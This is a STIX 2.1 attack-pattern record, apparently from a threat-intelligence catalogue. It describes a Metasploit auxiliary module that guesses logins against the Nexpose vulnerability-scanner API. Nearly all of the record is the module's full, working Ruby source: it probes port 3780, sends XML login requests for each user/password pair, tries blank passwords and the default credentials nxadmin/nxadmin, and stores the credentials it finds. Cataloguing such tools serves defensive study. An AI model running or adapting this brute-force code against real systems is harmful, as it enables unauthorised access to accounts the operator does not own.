{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--29b9a341-4bb5-4eac-9fcc-7359ffea4082",
    "created": "2024-08-14T16:26:36.098076Z",
    "modified": "2024-08-14T16:26:36.09808Z",
    "name": "NeXpose API Interface Login Utility",
    "description": " This module simply attempts to login to a NeXpose API interface using a specific user/pass. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/nexpose/nexpose_api_login.rb",
            "external_id": "nexpose_api_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'NeXpose API Interface Login Utility',\n      'Description'    => %q{\n        This module simply attempts to login to a NeXpose API interface using a\n        specific user/pass.\n      },\n      'Author'         => [ 'Vlatko Kosturjak <kost[at]linux.hr>' ],\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' => { 'SSL' => true }\n    )\n\n    register_options(\n      [\n        Opt::RPORT(3780),\n        OptString.new('URI', [true, \"URI for NeXpose API. Default is /api/1.1/xml\", \"/api/1.1/xml\"]),\n        OptBool.new('BLANK_PASSWORDS', [false, \"Try blank passwords for all users\", false])\n      ])\n  end\n\n  def run_host(ip)\n    begin\n      res = send_request_cgi({\n        'uri'     => datastore['URI'],\n        'method'  => 'GET'\n        }, 25)\n      http_fingerprint({ :response => res })\n    rescue ::Rex::ConnectionError => e\n      vprint_error(\"#{datastore['URI']} - #{e.to_s}\")\n      return\n    end\n\n    if not res\n      vprint_error(\"#{datastore['URI']} - No response\")\n      return\n    end\n    if res.code != 200\n      vprint_error(\"Did not get 200 for API XML interface\")\n      return\n    end\n\n    each_user_pass do |user, pass|\n      do_login(user, pass)\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: Time.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def do_login(user='nxadmin', pass='nxadmin')\n    vprint_status(\"Trying username:'#{user}' with password:'#{pass}'\")\n    headers = {\n      'Content-Type' => 'text/xml'\n    }\n    data = '<?xml version=\"1.0\" encoding=\"UTF-8\"?><LoginRequest sync-id=\"1\" user-id=\"' << user << '\" password=\"' << pass  << '\"></LoginRequest>'\n    begin\n      res = send_request_cgi({\n        'encode'   => true,\n        'uri'      => datastore['URI'],\n        'method'   => 'POST',\n        'headers'  => headers,\n        'data'     => data\n      }, 25)\n\n    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT\n      print_error(\"HTTP Connection Failed, Aborting\")\n      return :abort\n    end\n\n    if not res\n      print_error(\"HTTP Connection Error - res, Aborting\")\n      return :abort\n    end\n\n    if res.code != 200\n      vprint_error(\"FAILED LOGIN. '#{user}' : '#{pass}'\")\n      return :skip_pass\n    end\n\n    if res.code == 200\n      if res.body =~ /LoginResponse.*success=\"1\"/\n        print_good(\"SUCCESSFUL LOGIN. '#{user}' : '#{pass}'\")\n\n        report_cred(\n          ip: datastore['RHOST'],\n          port: datastore['RPORT'],\n          service_name: 'nexpose',\n          user: user,\n          password: pass,\n          proof: res.code.to_s\n        )\n        return :next_user\n      end\n    end\n    vprint_error(\"FAILED LOGIN. '#{user}' : '#{pass}'\")\n    return :skip_pass\n  end\nend\n"
}